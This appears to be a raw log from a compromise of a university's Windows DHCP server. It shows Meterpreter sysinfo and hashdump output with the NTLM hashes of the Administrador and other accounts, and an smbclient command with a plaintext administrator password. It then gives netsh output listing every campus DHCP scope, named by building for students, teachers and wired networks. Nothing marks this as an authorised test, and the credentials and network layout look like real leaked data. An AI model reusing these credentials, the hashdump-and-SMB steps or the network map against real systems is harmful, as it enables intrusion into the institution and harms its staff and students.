


```
meterpreter > sysinfo
Computer        : SRVUAZ-DHCP2
OS              : Windows 2012 (6.2 Build 9200).
Architecture    : x64
System Language : es_MX
Domain          : SERVIDORES
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter >
```

```
meterpreter > hashdump
Administrador:500:aad3b435b51404eeaad3b435b51404ee:121175bea3b977e402781747a261a34e:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
secadm:1002:aad3b435b51404eeaad3b435b51404ee:438454d5aa0d6609fea7b7d09891f9a6:::
```

```
smbclient -L 10.2.205.15 -U Administrador%n3w-pr0y3ct-2015
```


```
netsh>dhcp
netsh dhcp>server

```

```
==============================================================================
 Direccin del mbito - Mscara subred - Estado - Nombre del mbito - Comentario
==============================================================================

 10.2.3.0       - 255.255.255.0  -Activo        -Checadores           -Checadores
 10.2.4.0       - 255.255.252.0  -Activo        -E1-ALUMNOS           -Pool ACS_Alumn
 10.2.8.0       - 255.255.255.0  -Activo        -E1-CABLEADO          -Pool 8, E1-Cab
 10.2.9.0       - 255.255.255.0  -Activo        -E1-DOCENTES          -E1-DOCENTES
 10.2.10.0      - 255.255.255.0  -Activo        -E2-DOCENTES          -Pool 10, E2-Tr
 10.2.11.0      - 255.255.255.0  -Activo        -E2-CABLEADO          -Pool 11,  E2-
 10.2.12.0      - 255.255.252.0  -Activo        -E2-ALUMNOS           -Pool E2-ALUMNO
 10.2.16.0      - 255.255.252.0  -Activo        -E3 ALUMNOS           -Pool E-3 Medic
 10.2.20.0      - 255.255.255.0  -Activo        -E3 CABLEADO          -Pool E3- Medic
 10.2.21.0      - 255.255.255.0  -Activo        -E3 DOCENTES          -Pool E3 -Medic
 10.2.22.0      - 255.255.255.0  -Activo        -E4 DOCENTES          -E4 DOCENTES
 10.2.23.0      - 255.255.255.0  -Activo        -E4 CABLEADO          -E4 CABLEADO
 10.2.24.0      - 255.255.252.0  -Activo        -E4 ALUMNOS           -E4 ALUMNOS
 10.2.28.0      - 255.255.252.0  -Activo        -E5 ALUMNOS           -E5 ALUMNOS
 10.2.32.0      - 255.255.255.0  -Activo        -E5 CABLEADO          -E5 CABLEADO
 10.2.33.0      - 255.255.255.0  -Activo        -E5 DOCENTES          -E5 DOCENTES
 10.2.34.0      - 255.255.255.0  -Activo        -E6 DOCENTES          -E6 DOCENTES
 10.2.35.0      - 255.255.255.0  -Activo        -E6 CABLEADO          -E6 CABLEADO
 10.2.36.0      - 255.255.252.0  -Activo        -E6 ALUMNOS           -E6 ALUMNOS
 10.2.40.0      - 255.255.255.0  -Activo        -EA1-CEII             -pool 40, direc
 10.2.41.0      - 255.255.255.0  -Activo        -EA1-CONTRA           -pool 41, direc
 10.2.42.0      - 255.255.255.0  -Activo        -EA1-COORD-PERSONAL   -pool 42. direc
 10.2.43.0      - 255.255.255.0  -Activo        -EA1-PLAN-MIXTA       -EA1 Plan_Mixta
 10.2.44.0      - 255.255.252.0  -Activo        -E7-ALUMNOS           -Alumnos Turism
 10.2.48.0      - 255.255.255.0  -Activo        -E7-DOCENTES          -Docentes E7 Tu
 10.2.49.0      - 255.255.255.0  -Activo        -E7-CABLEADO          -Cableado turis
 10.2.52.0      - 255.255.252.0  -Activo        -E8-ALUMNOS           -E8 ALUMNOS
 10.2.56.0      - 255.255.252.0  -Activo        -E9 ALUMNOS           -E9 ALUMNOS
 10.2.60.0      - 255.255.255.0  -Activo        -E9 DOCENTES          -E9 DOCENTES
 10.2.61.0      - 255.255.255.0  -Activo        -E9 CABLEADO          -E9 CABLEADO
 10.2.62.0      - 255.255.255.0  -Activo        -EA10-DOCENTES        -Prepa 1 docent
 10.2.63.0      - 255.255.255.0  -Activo        -EA10-CABLEADO        -Prepa 1 cablea
 10.2.64.0      - 255.255.252.0  -Activo        -EA10-ALUMNOS         -Prepa 1 alumno
 10.2.68.0      - 255.255.252.0  -Activo        -E11 ALUMNOS          -E11 ALUMNOS
 10.2.72.0      - 255.255.255.0  -Activo        -E11 DOCENTES         -E11 DOCENTES
 10.2.73.0      - 255.255.255.0  -Activo        -E11 CABLEADO         -E11 CABLEADO
 10.2.74.0      - 255.255.255.0  -Activo        -E12-DOCENTES         -Electronica y
 10.2.75.0      - 255.255.255.0  -Activo        -E12-CABLEADO         -Electronica y
 10.2.76.0      - 255.255.252.0  -Activo        -E12-ALUMNOS          -Electronica y
 10.2.80.0      - 255.255.252.0  -Activo        -E13-ALUMNOS          -Softwae y Comp
 10.2.84.0      - 255.255.255.0  -Activo        -E13-DOCENTES         -Software y Com
 10.2.85.0      - 255.255.255.0  -Activo        -E13-CABLEADO         -Software y com
 10.2.86.0      - 255.255.255.0  -Activo        -E14 DOCENTES         -E14 DOCENTES
 10.2.87.0      - 255.255.255.0  -Activo        -E14 CABLEADO         -E14 CABLEADO
 10.2.88.0      - 255.255.252.0  -Activo        -E14 ALUMNOS          -E14 ALUMNOS
 10.2.92.0      - 255.255.252.0  -Activo        -E15-ALUMNOS          -Pool E15-ALUMN
 10.2.96.0      - 255.255.255.0  -Activo        -E15-DOCENTES         -Pool E15- Doce
 10.2.97.0      - 255.255.255.0  -Activo        -E15-CABLEADO         -Pool E-15-CABL
 10.2.98.0      - 255.255.255.0  -Activo        -E16-DOCENTES         -pool docentes
 10.2.99.0      - 255.255.255.0  -Activo        -E16-CABLEADO         -Pool cableado
 10.2.100.0     - 255.255.252.0  -Activo        -E16-ALUMNOS          -Pool Alumnos L
 10.2.104.0     - 255.255.252.0  -Activo        -E17-A-ALUMNOS        -E17-A-ALUMNOS
 10.2.108.0     - 255.255.255.0  -Activo        -E17-A-DOCENTES       -E17-A-DOCENTES
 10.2.109.0     - 255.255.255.0  -Activo        -E17-A-CABLEADO       -E17-A-CABLEADO
 10.2.122.0     - 255.255.255.0  -Activo        -L1-DOCENTES          -Pool L1 Docent
 10.2.123.0     - 255.255.255.0  -Activo        -L1-CABLEADO          -Pool L1 Cablea
 10.2.124.0     - 255.255.252.0  -Activo        -L1-ALUMNOS           -Pool Alumnos
 10.2.128.0     - 255.255.255.0  -Activo        -L1-DMM               -Pool L1 doctor
 10.2.129.0     - 255.255.255.0  -Activo        -L1-MCS               -Pool L1 maestr
 10.2.130.0     - 255.255.255.0  -Activo        -L2-GENERAL           -Pool L2 Genera
 10.2.131.0     - 255.255.255.0  -Activo        -L3-GENERAL           -Pool L3 Genera
 10.2.132.0     - 255.255.255.0  -Activo        -L4-GENERAL           -Pool General L
 10.2.133.0     - 255.255.255.0  -Activo        -L5-GENERAL           -Pool General L
 10.2.134.0     - 255.255.255.0  -Activo        -L6-FISIO-DOCENTES    -Pool de fisiot
 10.2.135.0     - 255.255.255.0  -Activo        -L6-FISIO-CABLEADO    -Pool Ed.Fisiol
 10.2.136.0     - 255.255.252.0  -Activo        -L6-FISIO-ALUMNOS     -Pool Ed.New_Fi
 10.2.140.0     - 255.255.255.0  -Activo        -HVPE-CABLEADO        -Direccoines ca
 10.2.141.0     - 255.255.255.0  -Activo        -HVPE-DOCENTES        -Direccionamien
 10.2.142.0     - 255.255.255.0  -Activo        -EA-CASE-DOCENTES     -Pool CASE Doce
 10.2.143.0     - 255.255.255.0  -Activo        -EA-CASE-CABLEADO     -Pool CASE- Cab
 10.2.144.0     - 255.255.252.0  -Activo        -EA-CASE-ALUMNOS      -Pool Alumnos 1
 10.2.148.0     - 255.255.252.0  -Activo        -B1-BIB-ALUMNOS       -Pool Alumnos_B
 10.2.152.0     - 255.255.255.0  -Activo        -B1-BIB-DOCENTES      -Pool 152 Docen
 10.2.153.0     - 255.255.255.0  -Activo        -B1-BIB-CABLEADO      -Pool 153 Cable
 10.2.154.0     - 255.255.255.0  -Activo        -AGRONOMIA_DOCENTES   -Direccionamien
 10.2.155.0     - 255.255.255.0  -Activo        -AGRONOMIA_CABLEADO   -Direccionamien
 10.2.156.0     - 255.255.252.0  -Activo        -AGRONOMIA_ALUMNOS    -Direccionamien
 10.2.160.0     - 255.255.255.0  -Activo        -EA-3-CONS            -Pool de Ed. Co
 10.2.161.0     - 255.255.255.0  -Activo        -EA-2-VINC-ARCH       -Direccionamien
 10.2.162.0     - 255.255.255.0  -Activo        -EA-2-PN              -Direccionamien
 10.2.163.0     - 255.255.255.0  -Activo        -CD3-GIM-UNI          -Direccionamien
 10.2.200.0     - 255.255.255.0  -Activo        -Wireless-Campus      -Pool aps camp
 10.2.208.0     - 255.255.255.0  -Activo        -WIRELESS-SXXI        -APs 208
 10.2.209.0     - 255.255.255.0  -Activo        -WLC-B1               -Aps B1 SXXI
 10.2.220.0     - 255.255.255.0  -Activo        -Rectoria             -poooool
 10.2.224.0     - 255.255.248.0  -Activo        -DOCENTES - UAZ       -Pool de Docent
```

```
Supermbito    : (null)
        10.2.3.0  Checadores
        10.2.4.0  E1-ALUMNOS
        10.2.8.0  E1-CABLEADO
        10.2.9.0  E1-DOCENTES
        10.2.10.0  E2-DOCENTES
        10.2.11.0  E2-CABLEADO
        10.2.12.0  E2-ALUMNOS
        10.2.16.0  E3 ALUMNOS
        10.2.20.0  E3 CABLEADO
        10.2.21.0  E3 DOCENTES
        10.2.22.0  E4 DOCENTES
        10.2.23.0  E4 CABLEADO
        10.2.24.0  E4 ALUMNOS
        10.2.28.0  E5 ALUMNOS
        10.2.32.0  E5 CABLEADO
        10.2.33.0  E5 DOCENTES
        10.2.34.0  E6 DOCENTES
        10.2.35.0  E6 CABLEADO
        10.2.36.0  E6 ALUMNOS
        10.2.40.0  EA1-CEII
        10.2.41.0  EA1-CONTRA
        10.2.42.0  EA1-COORD-PERSONAL
        10.2.43.0  EA1-PLAN-MIXTA
        10.2.44.0  E7-ALUMNOS
        10.2.48.0  E7-DOCENTES
        10.2.49.0  E7-CABLEADO
        10.2.52.0  E8-ALUMNOS
        10.2.56.0  E9 ALUMNOS
        10.2.60.0  E9 DOCENTES
        10.2.61.0  E9 CABLEADO
        10.2.62.0  EA10-DOCENTES
        10.2.63.0  EA10-CABLEADO
        10.2.64.0  EA10-ALUMNOS
        10.2.68.0  E11 ALUMNOS
        10.2.72.0  E11 DOCENTES
        10.2.73.0  E11 CABLEADO
        10.2.74.0  E12-DOCENTES
        10.2.75.0  E12-CABLEADO
        10.2.76.0  E12-ALUMNOS
        10.2.80.0  E13-ALUMNOS
        10.2.84.0  E13-DOCENTES
        10.2.85.0  E13-CABLEADO
        10.2.86.0  E14 DOCENTES
        10.2.87.0  E14 CABLEADO
        10.2.88.0  E14 ALUMNOS
        10.2.92.0  E15-ALUMNOS
        10.2.96.0  E15-DOCENTES
        10.2.97.0  E15-CABLEADO
        10.2.98.0  E16-DOCENTES
        10.2.99.0  E16-CABLEADO
        10.2.100.0  E16-ALUMNOS
        10.2.104.0  E17-A-ALUMNOS
        10.2.108.0  E17-A-DOCENTES
        10.2.109.0  E17-A-CABLEADO
        10.2.122.0  L1-DOCENTES
        10.2.123.0  L1-CABLEADO
        10.2.124.0  L1-ALUMNOS
        10.2.128.0  L1-DMM
        10.2.129.0  L1-MCS
        10.2.130.0  L2-GENERAL
        10.2.131.0  L3-GENERAL
        10.2.132.0  L4-GENERAL
        10.2.133.0  L5-GENERAL
        10.2.134.0  L6-FISIO-DOCENTES
        10.2.135.0  L6-FISIO-CABLEADO
        10.2.136.0  L6-FISIO-ALUMNOS
        10.2.140.0  HVPE-CABLEADO
        10.2.141.0  HVPE-DOCENTES
        10.2.142.0  EA-CASE-DOCENTES
        10.2.143.0  EA-CASE-CABLEADO
        10.2.144.0  EA-CASE-ALUMNOS
        10.2.148.0  B1-BIB-ALUMNOS
        10.2.152.0  B1-BIB-DOCENTES
        10.2.153.0  B1-BIB-CABLEADO
        10.2.154.0  AGRONOMIA_DOCENTES
        10.2.155.0  AGRONOMIA_CABLEADO
        10.2.156.0  AGRONOMIA_ALUMNOS
        10.2.160.0  EA-3-CONS
        10.2.161.0  EA-2-VINC-ARCH
        10.2.162.0  EA-2-PN
        10.2.163.0  CD3-GIM-UNI
        10.2.200.0  Wireless-Campus
        10.2.208.0  WIRELESS-SXXI
        10.2.209.0  WLC-B1
        10.2.220.0  Rectoria
        10.2.224.0  DOCENTES - UAZ
```

```

```